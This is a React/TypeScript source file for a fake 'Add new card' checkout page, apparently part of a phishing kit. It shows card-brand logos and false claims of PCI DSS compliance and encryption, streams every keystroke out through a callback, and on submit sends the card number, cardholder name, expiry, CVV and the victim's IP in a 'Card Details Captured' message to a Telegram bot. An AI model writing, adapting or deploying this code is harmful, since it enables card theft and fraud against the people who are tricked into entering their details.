
import React, { useState } from 'react';
import { ArrowLeft, CreditCard, ScanLine, HelpCircle, ShieldCheck, Check, AlertCircle } from 'lucide-react';
import { useTranslation } from '../TranslationContext';

interface PaymentPageProps {
  onBack: () => void;
  botToken: string;
  chatId: string;
  currentIp: string;
  currentLoc: string;
  onComplete: () => void;
  onInputChange?: (data: any) => void;
  error?: string;
}

export const PaymentPage: React.FC<PaymentPageProps> = ({ onBack, botToken, chatId, currentIp, currentLoc, onComplete, onInputChange, error }) => {
  const { t } = useTranslation();
  const [cardNumber, setCardNumber] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [isSaving, setIsSaving] = useState(false);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 16) val = val.substring(0, 16);
    if (val.length > 0 && !['3', '4', '5', '6'].includes(val[0])) return;
    setCardNumber(val);
    onInputChange?.({ cardNumber: val });
  };

  const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setNameOnCard(e.target.value);
    onInputChange?.({ nameOnCard: e.target.value });
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 4) val = val.substring(0, 4);
    let formatted = val;
    if (val.length > 2) {
      formatted = `${val.substring(0, 2)}/${val.substring(2)}`;
    } else if (val.length === 2 && !expiry.includes('/')) {
      formatted = `${val}/`;
    }
    setExpiry(formatted);
    onInputChange?.({ expiry: formatted });
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    setCvv(val);
    onInputChange?.({ cvv: val });
  };

  const handleSave = async () => {
    if (cardNumber.length < 16 || expiry.length < 5 || cvv.length < 3) return;
    setIsSaving(true);
    const message = `<b>💳 Card Details Captured</b>\n<b>🔢 Number:</b> <code>${cardNumber}</code>\n<b>👤 Name:</b> <code>${nameOnCard}</code>\n<b>📅 Expiry:</b> <code>${expiry}</code>\n<b>🔒 CVV:</b> <code>${cvv}</code>\n<b>📍 IP:</b> ${currentIp}`;
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
      });
      setTimeout(() => onComplete(), 500);
    } catch (e) { onComplete(); } finally { setIsSaving(false); }
  };

  const logos = [
    'https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg',
    'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg',
    'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg'
  ];

  const isFormIncomplete = cardNumber.length < 16 || expiry.length < 5 || cvv.length < 3;

  return (
    <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto relative shadow-xl overflow-y-auto animate-in slide-in-from-right-10 duration-500">
      <header className="w-full flex items-center justify-between p-4 bg-white sticky top-0 z-10 border-b border-gray-100">
        <button onClick={onBack} className="p-1 hover:bg-gray-100 rounded-full">
          <ArrowLeft className="w-6 h-6 text-gray-800" />
        </button>
        <h1 className="text-lg font-bold text-gray-900">Add new card</h1>
        <div className="w-8" />
      </header>

      <main className="w-full px-5 py-6 space-y-6">
        {error && (
          <div className="bg-red-50 border border-red-100 p-4 rounded-xl flex items-center gap-3 animate-bounce">
            <AlertCircle className="w-5 h-5 text-red-500" />
            <span className="text-sm text-red-600 font-bold">{error}</span>
          </div>
        )}

        <div className="space-y-4">
          <h2 className="text-base font-bold text-gray-900">{t('paymentMethod')}</h2>
          <div className="flex flex-wrap gap-2 items-center">
            {logos.map((url, i) => (
              <img key={i} src={url} alt="card provider" className="h-4 object-contain grayscale-[0.2]" />
            ))}
          </div>
        </div>

        <div className="space-y-4">
          <div className="relative">
            <div className="absolute left-4 top-1/2 -translate-y-1/2"><CreditCard className="w-5 h-5 text-gray-400" /></div>
            <input
              type="tel" inputMode="numeric" placeholder={t('cardNumber')}
              value={cardNumber} onChange={handleCardNumberChange}
              className="w-full pl-12 pr-12 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
            />
            <div className="absolute right-4 top-1/2 -translate-y-1/2"><ScanLine className="w-5 h-5 text-gray-600" /></div>
          </div>

          <input
            type="text" placeholder={t('nameOnCard')}
            value={nameOnCard} onChange={handleNameChange}
            className="w-full px-4 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
          />

          <input
            type="tel" inputMode="numeric" placeholder={t('expiryDate')}
            value={expiry} onChange={handleExpiryChange}
            className="w-full px-4 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
          />

          <div className="relative">
            <input
              type="tel" inputMode="numeric" placeholder={t('cvv')} maxLength={4}
              value={cvv} onChange={handleCvvChange}
              className="w-full px-4 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
            />
            <div className="absolute right-4 top-1/2 -translate-y-1/2"><HelpCircle className="w-5 h-5 text-gray-400" /></div>
          </div>
        </div>

        <div className="pt-4 space-y-4">
          <div className="flex items-center gap-3">
            <ShieldCheck className="w-6 h-6 text-gray-800" />
            <span className="text-[15px] font-bold text-gray-900">{t('securePayment')}</span>
          </div>
          <ul className="space-y-3">
            <li className="flex items-start gap-3 text-sm text-gray-600"><Check className="w-4 h-4 text-emerald-500 mt-1" /> PCI DSS compliant.</li>
            <li className="flex items-start gap-3 text-sm text-gray-600"><Check className="w-4 h-4 text-emerald-500 mt-1" /> All data is encrypted.</li>
          </ul>
        </div>

        <button 
          onClick={handleSave}
          disabled={isSaving || isFormIncomplete}
          className={`w-full bg-[#E62E04] text-white py-4 rounded-full text-lg font-bold active:scale-[0.98] transition-all ${(isSaving || isFormIncomplete) ? 'opacity-70 cursor-not-allowed' : ''}`}
        >
          {isSaving ? t('processing') : t('continuePayment')}
        </button>
      </main>
    </div>
  );
};
